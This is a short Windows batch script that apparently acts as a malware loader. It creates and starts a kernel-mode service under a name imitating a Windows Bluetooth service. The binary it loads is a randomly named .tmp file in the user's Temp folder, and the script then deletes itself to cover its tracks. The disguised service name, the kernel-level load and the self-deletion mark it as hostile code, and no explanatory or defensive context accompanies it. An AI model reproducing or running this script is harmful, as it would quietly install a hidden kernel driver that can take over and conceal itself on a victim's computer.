@echo off
cd %~dp0
sc create BluetoothUserService7 binpath=C:\Users\%username%\AppData\Local\Temp\61fc8a92-d37b-4c06-8b45-e798d21a57c3.tmp type=kernel
sc start BluetoothUserService7
del "%~f0"